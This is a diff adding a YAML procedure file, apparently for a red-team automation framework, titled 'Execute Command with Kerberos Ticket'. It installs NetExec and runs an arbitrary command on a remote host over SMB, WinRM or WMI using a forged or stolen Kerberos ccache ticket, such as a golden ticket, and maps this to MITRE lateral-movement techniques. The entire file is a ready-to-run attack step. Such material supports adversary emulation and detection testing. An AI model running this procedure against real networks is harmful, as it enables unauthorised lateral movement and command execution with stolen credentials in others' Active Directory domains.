@@ -1,0 +1,60 @@
+---
+api_version: 2.0
+uuid: 857240d1-72d7-419a-a43c-9c4d63f7161e
+name: Execute Command with Kerberos Ticket
+authors:
+  - isaac_fletcher
+description: |
+  Executes a command on a remote host using a forged or stolen Kerberos ticket (ccache file)
+  via NetExec (nxc). Supports multiple protocols including SMB, WinRM, and WMI for flexible
+  lateral movement.
+requirements:
+  platforms:
+    - os: linux
+    - os: darwin
+mitre:
+  tactics:
+    - TA0008 Lateral Movement
+  techniques:
+    - T1021 Remote Services
+  subtechniques:
+    - T1021.002 SMB/Windows Admin Shares
+    - T1021.006 Windows Remote Management
+args:
+  - name: ticket_path
+    description: Path to the Kerberos .ccache ticket file (e.g., /tmp/golden_ticket.ccache)
+  - name: command
+    description: The command to execute on the remote host
+  - name: target
+    description: The target host to execute the command on (must be a FQDN that matches the ticket's SPN)
+  - name: domain
+    description: The target Active Directory domain
+    default: contoso.local
+  - name: protocol
+    description: The protocol to use for remote command execution.
+    choices:
+      - smb
+      - winrm
+      - wmi
+    default: smb
+  - name: dc_ip
+    description: IP address or hostname of the Domain Controller for Kerberos ticket resolution
+    default: dc01.contoso.local
+steps:
+  - name: setup_netexec
+    description: Install NetExec
+    ttp: //utils/pip-install/ttp.yaml
+    args:
+      modules: "netexec"
+
+  - name: execute_command
+    description: Execute a command on the remote host using the provided Kerberos ticket
+    inline: |
+      export KRB5CCNAME="{{.Args.ticket_path}}"
+
+      nxc {{.Args.protocol}} "{{.Args.target}}" \
+        -k \
+        --use-kcache \
+        --kdcHost "{{.Args.dc_ip}}" \
+        -d "{{.Args.domain}}" \
+        -X "{{.Args.command}}"
